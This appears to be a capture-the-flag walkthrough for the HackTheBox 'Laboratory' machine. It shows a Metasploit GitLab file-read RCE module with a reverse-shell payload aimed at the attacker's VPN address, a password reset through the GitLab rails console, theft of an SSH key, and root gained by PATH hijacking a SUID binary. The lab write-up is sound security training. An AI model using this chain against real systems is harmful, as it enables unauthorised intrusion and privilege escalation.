# User

![image](https://user-images.githubusercontent.com/24206178/154681635-a2aca730-052c-4975-a41e-888c2c3f08f6.png)

below laboratory.htb there's a domain git.laboratory.htb

Add that to /etc/hosts as well as 
10.10.10.216 laboratory.htb git.laboratory.htb

![image](https://user-images.githubusercontent.com/24206178/154681664-f8c84ea2-9843-4375-96b6-5a7d19155059.png)

![image](https://user-images.githubusercontent.com/24206178/154681676-632e7dae-6cf5-4ce6-860c-fbb5fca0431f.png)

create an account

![image](https://user-images.githubusercontent.com/24206178/154681694-5b13c9c4-83e7-441b-a7e4-78b2f774ad3e.png)

find a version of gitlab

GitLab Community Edition 12.8.1

exploit 

exploit/multi/http/gitlab_file_read_rce

payload

generic/shell_reverse_tcp

![image](https://user-images.githubusercontent.com/24206178/154681719-1b1733b9-fee9-4c4f-8ae9-b063b4de0194.png)


now focus

set usrname and password →  the username and the password from the account you created 

set RHOSTS →   10.10.10.216
set LHOST →     10.10.16.4          This one tun0: 10.10.16.4 is the vpn ip
Set RPORT →     443
Set SSL →         true


Command shell session 1 opened (10.10.16.4:4444 -> 10.10.10.216:33394)
[1:02 AM]
whoami
git

Gitlab-rails console reset user password

Reset the dexer user password

After that log into the gitlab again using the new password

you need to look into what's there on dexter's repository on gitlab

authorized_keys

now you have a private ssh key that allows you to login to the machine as user dexter

save the key in text file

then

chmod 600 id_rsa

//Permissions of 600 mean that the owner has full read and write access to the file, while no other user can access the file

dexter@10.10.10.216 -i id_rsa

Important Note:
if there is an error 

Error loading key "./id_rsa": invalid format

open that id_rsa file and make sure that there's a new line after -----END OPENSSH PRIVATE KEY-----

# Root
Using the Dexter user, we need to enumerae a little bit

//search for suid binary

//You have to explt docker-security binary

//docker-security binary is a SUID so you have to exploit
//u can run linpeas.sh
// i use linpeas to find me suid
//find / -perm -4000 2>/dev/null

A lot of directories

/usr/local/bin/docker-security

echo "/bin/bash" > chmod    //first one is write /bin/bash into chmod file

chmod +x chmod      //second one is give permission to chmod

export PATH=$PWD:$PATH      //export the pwd and path into path

echo $PATH          //

/usr/local/bin/docker-security          //

![image](https://user-images.githubusercontent.com/24206178/154681818-f84e6b46-2666-4f4d-a3a8-2d031470f78c.png)
